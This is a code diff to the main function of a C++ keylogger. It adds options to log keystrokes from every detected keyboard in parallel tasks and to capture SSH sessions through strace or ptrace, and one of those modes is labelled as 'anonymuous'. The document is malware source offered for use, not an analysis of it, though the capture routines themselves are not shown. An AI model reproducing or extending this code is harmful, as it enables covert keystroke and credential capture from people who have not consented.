@@ -1,4 +1,5 @@
 #include "keylogger.hpp"
+#include "spookey.hhp"
 
 namespace po = boost::program_options;
 
@@ -7,14 +8,14 @@ int main(int argc, char **argv) {
     int64_t sleep_time = 3;
     if(!fs::exists(path_to_log)){
         fs::create_directories(path_to_log);
-        std::cout << "DIR is created" << std::endl;
+        DEBUG_STDOUT("DIR is created");
     }
 
     options_description desc{"Options"};
     desc.add_options()
-            ("help", "print all support info")
-            ("strace,s", "run ssh keylogger via STRACE mechanism(no anonymuous, default option)")
-            ("ptrace,p", "run ssh keylogger via PTRACE mechanism(anonymuous)");
+            ("help", "produce help message")
+            ("kboard,k", value<std::string>()->default_value("ON"), "[ON/OFF] run logging all detected keyboards(default option)")
+            ("mode,m", value<std::string>()->default_value("strace"), "[strace/ptrace] run ssh keylogger via STRACE or PRACE(ptrace in developing now) mechanism");
 
     po::variables_map vm;
     po::store(po::parse_command_line(argc, argv, desc), vm);
@@ -25,9 +26,26 @@ int main(int argc, char **argv) {
         return 1;
     }
 
+    std::vector<Keyboard> keyboards = findKeyboards();
+    std::vector<std::future<void>> captureTasks;
+    captureTasks.reserve(keyboards.size());
+
+    auto kboard_log_flag = vm["kboard"].as<std::string>();
+    if (kboard_log_flag == "OFF") {
+        DEBUG_STDOUT("Logging keyboards: OFF");
+    } else if (kboard_log_flag == "ON"){
+        DEBUG_STDOUT("Logging keyboards: ON");
+        for (auto& kbd : keyboards)
+            captureTasks.push_back(
+                    std::async(std::launch::async, &Keyboard::capture, &kbd));
+    }
+
+
+
     while(true){
-        if (vm.count("strace,s")) check_ps(1);
-        else check_ps(0);
+        auto mode = vm["mode"].as<std::string>();
+        if (mode == "strace") check_ps("strace");
+        else check_ps("ptrace");
         std::this_thread::sleep_for(std::chrono::seconds(sleep_time));
     }
 }
